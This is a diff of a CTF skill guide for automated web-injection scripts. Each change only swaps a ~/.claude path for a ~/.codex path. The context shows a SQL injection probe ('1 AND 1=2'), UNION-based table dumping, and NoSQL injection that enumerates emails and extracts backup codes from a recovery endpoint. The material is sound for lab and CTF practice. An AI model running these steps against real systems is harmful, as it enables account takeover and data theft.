@@ -30,7 +30,7 @@ curl -si "<target>/api/items/1%20AND%201=2" $AUTH_HEADER  # numeric ctx: the one
 every position `UNTESTED` (not cleared) when the ids 401:
 
 ```bash
-python3 ~/.claude/skills/web-ctf/scripts/sqlquick.py --sweep --base <target> \
+python3 ~/.codex/skills/web-ctf/scripts/sqlquick.py --sweep --base <target> \
   --methods recon/methods.txt --token "$TOKEN" --out recon/sqlisweep_auth
 ```
 
@@ -48,14 +48,14 @@ with a numbered `UNION SELECT`, and dumps SQLite tables whose name matches a pri
 through that same UNION, stopping the moment a flag shows up:
 
 ```bash
-python3 ~/.claude/skills/web-ctf/scripts/sqlquick.py --url "<target>/api/search?q=1" --token "$TOKEN"
+python3 ~/.codex/skills/web-ctf/scripts/sqlquick.py --url "<target>/api/search?q=1" --token "$TOKEN"
 # param is inferred when the URL has exactly one query param; otherwise pass --param
-python3 ~/.claude/skills/web-ctf/scripts/sqlquick.py --url "<target>/api/items?id=1&sort=name" \
+python3 ~/.codex/skills/web-ctf/scripts/sqlquick.py --url "<target>/api/items?id=1&sort=name" \
   --param id --cookie "session=<value>"
 # a path parameter has no name to pass: --path-param takes the last segment, or mark it with *
-python3 ~/.claude/skills/web-ctf/scripts/sqlquick.py --url "<target>/api/products/1" \
+python3 ~/.codex/skills/web-ctf/scripts/sqlquick.py --url "<target>/api/products/1" \
   --path-param --token "$TOKEN"
-python3 ~/.claude/skills/web-ctf/scripts/sqlquick.py --url "<target>/api/products/*/reviews" \
+python3 ~/.codex/skills/web-ctf/scripts/sqlquick.py --url "<target>/api/products/*/reviews" \
   --seed 1 --token "$TOKEN"
 ```
 
@@ -115,7 +115,7 @@ unexpected password library can crash a fragile lab. `nosqlquick.py` refuses tho
 unless `--dangerous-auth` is supplied.
 
 ```bash
-python3 ~/.claude/skills/web-ctf/scripts/nosqlquick.py \
+python3 ~/.codex/skills/web-ctf/scripts/nosqlquick.py \
   --url "<target>/api/account/recover" \
   --field email --field backupCode \
   --baseline email=none@example.test --baseline backupCode=invalid \
@@ -132,7 +132,7 @@ binding or validation.
 Enumerate a returned identity with a monotonic `$gt` cursor:
 
 ```bash
-python3 ~/.claude/skills/web-ctf/scripts/nosqlquick.py \
+python3 ~/.codex/skills/web-ctf/scripts/nosqlquick.py \
   --url "<target>/api/account/recover" --field email --field backupCode \
   --enumerate email --identity-json email --success-json status=verified
 ```
@@ -142,7 +142,7 @@ alphabet or length. The extractor defaults to printable ASCII, binary-searches r
 classes, and checks exact `$eq` after every prefix:
 
 ```bash
-python3 ~/.claude/skills/web-ctf/scripts/nosqlquick.py \
+python3 ~/.codex/skills/web-ctf/scripts/nosqlquick.py \
   --url "<target>/api/account/recover" --field email --field backupCode \
   --lock email=user@example.test --extract backupCode \
   --success-json status=verified
